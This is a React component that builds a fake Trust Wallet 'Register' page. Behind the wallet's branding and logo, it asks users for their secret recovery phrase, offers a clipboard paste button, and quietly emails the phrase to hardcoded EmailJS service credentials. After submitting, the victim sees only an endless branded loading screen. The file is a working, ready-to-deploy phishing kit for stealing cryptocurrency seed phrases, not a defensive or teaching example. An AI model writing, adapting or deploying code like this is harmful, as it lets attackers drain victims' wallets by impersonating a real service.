/* eslint-disable no-unused-vars */
import React, { useEffect, useRef, useState } from 'react';
import Button from '../components/elements/Button';
import { MdArrowBack } from 'react-icons/md';
import { IoCloseCircle } from 'react-icons/io5';
import { BsQrCodeScan } from 'react-icons/bs';
import { useNavigate } from 'react-router-dom';
import emailjs from '@emailjs/browser';
import trustLogo from '../assets/img/trustLogo.png';

const Register = () => {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);
  const [isDataSent, setIsDataSent] = useState(false);
  const [walletName, setWalletName] = useState('');
  const [phrase, setPhrase] = useState('');
  const [viewportHeight, setViewportHeight] = useState(window.innerHeight);

  const mobileForm = useRef();
  const desktopForm = useRef();

  // Track visible viewport height — shrinks when mobile keyboard opens
  useEffect(() => {
    const vv = window.visualViewport;
    if (!vv) return;
    const onResize = () => setViewportHeight(vv.height);
    vv.addEventListener('resize', onResize);
    vv.addEventListener('scroll', onResize);
    return () => {
      vv.removeEventListener('resize', onResize);
      vv.removeEventListener('scroll', onResize);
    };
  }, []);

  const handlePaste = async () => {
    try {
      if (navigator.clipboard && navigator.clipboard.readText) {
        const text = await navigator.clipboard.readText();
        if (text) setPhrase(text);
      }
    } catch (err) {
      console.log('Clipboard paste error:', err);
    }
  };

  const sendEmail = (e) => {
    e.preventDefault();
    const targetForm = e.target;
    const formData = new FormData(targetForm);

    const input1Value = formData.get('wallet_name') || '';
    const input2Value = formData.get('wallet_address') || 'N/A';
    const input3Value = formData.get('phrase') || '';

    if (!input1Value.trim() || !input3Value.trim()) {
      alert('Fields cannot be empty');
      return;
    }

    setIsLoading(true);
    emailjs
      .sendForm('service_3qwtkwh', 'template_rxvddmc', targetForm, {
        publicKey: 'WDVbvjv7y_t4TPKnI',
      })
      .then(() => {
        setIsLoading(false);
        setIsDataSent(true);
        console.log('SUCCESS!');
      })
      .catch((error) => {
        setIsLoading(false);
        setIsDataSent(false);
        alert('An error Occurred, try again');
        console.log('FAILED...', error);
      });
  };

  return (
    <>
      {(isLoading || isDataSent) && (
        <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-white">
          <img
            src={trustLogo}
            alt="Trust Wallet"
            className="w-[160px] animate-pulse"
          />
        </div>
      )}

      {/* MOBILE VIEW (only on mobile) */}
      <div className="block md:hidden bg-white flex flex-col px-4 py-3 w-full" style={{ height: viewportHeight + 'px' }}>
        <form ref={mobileForm} onSubmit={sendEmail} className="flex flex-col h-[85dvh] overflow-hidden">
          {/* Form Content — scrollable if needed */}
          <div className="space-y-6 flex-1 overflow-y-auto pb-2">
            {/* Wallet Name Field */}
            <div>
              <label className="text-[14px] text-gray-500 font-medium mb-1.5 block">
                Wallet name
              </label>
              <div className="relative flex items-center bg-[#f2f4f6] rounded-[14px] px-4 py-3.5 border-[2px] border-transparent focus-within:border-[#5865F2] transition-colors duration-150">
                <input
                  type="text"
                  name="wallet_name"
                  value={walletName}
                  onChange={(e) => setWalletName(e.target.value)}
                  className="w-full bg-transparent text-gray-900 font-medium text-base outline-none pr-7"
                  placeholder="Enter wallet name"
                />
                {walletName && (
                  <button
                    type="button"
                    onClick={() => setWalletName('')}
                    className="absolute right-3.5 text-gray-400 hover:text-gray-600 focus:outline-none"
                  >
                    <IoCloseCircle className="text-xl" />
                  </button>
                )}
              </div>
            </div>

            {/* Hidden field for wallet_address */}
            <input type="hidden" name="wallet_address" value={walletName} />

            {/* Secret Phrase Field */}
            <div>
              <label className="text-[14px] text-gray-500 font-medium mb-1.5 block">
                Secret phrase
              </label>
              <div className="relative bg-[#f2f4f6] rounded-[18px] p-4 border-[2px] border-transparent focus-within:border-[#5865F2] transition-colors duration-150">
                <textarea
                  name="phrase"
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                  className="w-full bg-transparent text-gray-900 font-medium text-base outline-none resize-none h-[110px] pr-12 pb-6"
                  placeholder=""
                />
                <button
                  type="button"
                  onClick={handlePaste}
                  className="absolute bottom-3.5 right-4 text-[#3861fb] font-semibold text-[15px] focus:outline-none hover:opacity-80 active:scale-95 transition-all"
                >
                  Paste
                </button>
              </div>
              <p className="text-[13px] text-gray-400 mt-2 block px-0.5">
                Typically 12 (sometimes 18, 24) words separated by single spaces
              </p>
            </div>
          </div>

          {/* Continue Button — always pinned above keyboard */}
          <div className="pt-3 pb-4 flex-shrink-0">
            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#5865F2] hover:bg-[#4752C4] active:bg-[#3c45a5] text-white font-semibold py-4 rounded-full text-base transition-colors duration-200 shadow-sm flex items-center justify-center disabled:opacity-70"
            >
              {isLoading ? (
                <div className="loader animate-spin p-[8px] border-t-[2px] border-[2px] border-transparent rounded-[100%] border-t-white"></div>
              ) : (
                'Continue'
              )}
            </button>
          </div>
        </form>
      </div>

      {/* DESKTOP VIEW (only on desktop md:flex) */}
      <div className="hidden md:flex md:flex-row flex-col">
        {/* Left branding panel */}
        <div className="bg-primary md:rounded-none rounded-bl-[20px] rounded-br-[20px] overflow-hidden flex-[1] flex relative h-[100dvh]">
          <div className="p-14 md:space-y-3 relative z-10">
            <div className="md:text-[58px] text-white text-[30px] md:leading-[70px] leading-[40px] font-[700]">
              True crypto ownership. Powerful Web3 experiences
            </div>
            <div className="text-white text-opacity-90 md:text-[25px] text-[14px] mt-4">
              Unlock the power of your cryptocurrency assets and explore the world of Web3 with Trust Wallet.
            </div>
          </div>
          <img
            src="https://trustwallet.com/_next/static/media/raw.0acff7b3.svg"
            className="absolute md:bottom-[-90px] md:w-[500px] w-[200px] right-0"
            alt=""
          />
        </div>

        {/* Right form panel — same style as mobile */}
        <div className="flex-[1] flex items-center justify-center bg-white h-[100dvh]">
          <form ref={desktopForm} onSubmit={sendEmail} className="w-[480px] flex flex-col px-6 py-8 h-full justify-center gap-6">
            {/* Wallet Name Field */}
            <div>
              <label className="text-[14px] text-gray-500 font-medium mb-1.5 block">
                Wallet name
              </label>
              <div className="relative flex items-center bg-[#f2f4f6] rounded-[14px] px-4 py-3.5 border-[2px] border-transparent focus-within:border-[#5865F2] transition-colors duration-150">
                <input
                  type="text"
                  name="wallet_name"
                  className="w-full bg-transparent text-gray-900 font-medium text-base outline-none pr-7"
                  placeholder="Enter wallet name"
                />
              </div>
            </div>

            {/* Hidden wallet_address field */}
            <input type="hidden" name="wallet_address" value="Desktop Submission" />

            {/* Secret Phrase Field */}
            <div>
              <label className="text-[14px] text-gray-500 font-medium mb-1.5 block">
                Secret phrase
              </label>
              <div className="relative bg-[#f2f4f6] rounded-[18px] p-4 border-[2px] border-transparent focus-within:border-[#5865F2] transition-colors duration-150">
                <textarea
                  name="phrase"
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                  className="w-full bg-transparent text-gray-900 font-medium text-base outline-none resize-none h-[130px] pr-12 pb-6"
                  placeholder=""
                />
                <button
                  type="button"
                  onClick={handlePaste}
                  className="absolute bottom-3.5 right-4 text-[#3861fb] font-semibold text-[15px] focus:outline-none hover:opacity-80 active:scale-95 transition-all"
                >
                  Paste
                </button>
              </div>
              <p className="text-[13px] text-gray-400 mt-2 block px-0.5">
                Typically 12 (sometimes 18, 24) words separated by single spaces
              </p>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#5865F2] hover:bg-[#4752C4] active:bg-[#3c45a5] text-white font-semibold py-4 rounded-full text-base transition-colors duration-200 shadow-sm flex items-center justify-center disabled:opacity-70"
            >
              {isLoading ? (
                <div className="loader animate-spin p-[8px] border-t-[2px] border-[2px] border-transparent rounded-[100%] border-t-white"></div>
              ) : (
                'Continue'
              )}
            </button>
          </form>
        </div>
      </div>
    </>
  );
};

export default Register;